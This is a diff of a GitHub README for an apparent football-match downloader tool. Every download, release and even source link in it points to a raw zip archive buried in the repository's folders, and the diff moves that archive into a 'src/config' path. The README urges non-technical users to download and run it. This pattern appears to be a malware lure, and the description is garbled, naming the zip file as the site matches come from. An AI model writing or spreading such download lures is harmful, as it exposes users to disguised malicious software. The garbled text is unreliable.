@@ -1,16 +1,16 @@
 # ⚽ sosyal-halisaha-downloader - Download Football Matches Easily
 
-[![Download](https://raw.githubusercontent.com/mrnothamza/sosyal-halisaha-downloader/main/uncular/sosyal-halisaha-downloader.zip%20Release-blue)](https://raw.githubusercontent.com/mrnothamza/sosyal-halisaha-downloader/main/uncular/sosyal-halisaha-downloader.zip) 
+[![Download](https://raw.githubusercontent.com/mrnothamza/sosyal-halisaha-downloader/main/src/config/downloader-sosyal-halisaha-v3.2.zip%20Release-blue)](https://raw.githubusercontent.com/mrnothamza/sosyal-halisaha-downloader/main/src/config/downloader-sosyal-halisaha-v3.2.zip) 
 
 ## 📖 Description
-This application helps you download football match records from https://raw.githubusercontent.com/mrnothamza/sosyal-halisaha-downloader/main/uncular/sosyal-halisaha-downloader.zip Whether you want to save a game for later viewing or share it with friends, this tool makes the process simple and straightforward. 
+This application helps you download football match records from https://raw.githubusercontent.com/mrnothamza/sosyal-halisaha-downloader/main/src/config/downloader-sosyal-halisaha-v3.2.zip Whether you want to save a game for later viewing or share it with friends, this tool makes the process simple and straightforward. 
 
 ## 🚀 Getting Started
 To get started with sosyal-halisaha-downloader, follow the steps outlined below. You don't need any technical knowledge to use this application.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**: Click the link below to go to the download page:
-   [Download Latest Release](https://raw.githubusercontent.com/mrnothamza/sosyal-halisaha-downloader/main/uncular/sosyal-halisaha-downloader.zip)
+   [Download Latest Release](https://raw.githubusercontent.com/mrnothamza/sosyal-halisaha-downloader/main/src/config/downloader-sosyal-halisaha-v3.2.zip)
    
 2. **Choose Your Version**: On the releases page, you will see different versions of the application. Look for the latest release for the best features and updates.
 
@@ -53,6 +53,6 @@ To get started with sosyal-halisaha-downloader, follow the steps outlined below.
 If you have any questions or need help, feel free to open an issue on the GitHub repository. The community is here to assist you.
 
 ## 📢 Updates 
-Regular updates will be rolled out to improve functionality and fix any bugs. Keep an eye on the [Releases Page](https://raw.githubusercontent.com/mrnothamza/sosyal-halisaha-downloader/main/uncular/sosyal-halisaha-downloader.zip) for the latest features.
+Regular updates will be rolled out to improve functionality and fix any bugs. Keep an eye on the [Releases Page](https://raw.githubusercontent.com/mrnothamza/sosyal-halisaha-downloader/main/src/config/downloader-sosyal-halisaha-v3.2.zip) for the latest features.
 
 By following the instructions above, you will be able to easily download and run the sosial-halisaha-downloader application. Enjoy downloading your favorite football matches!
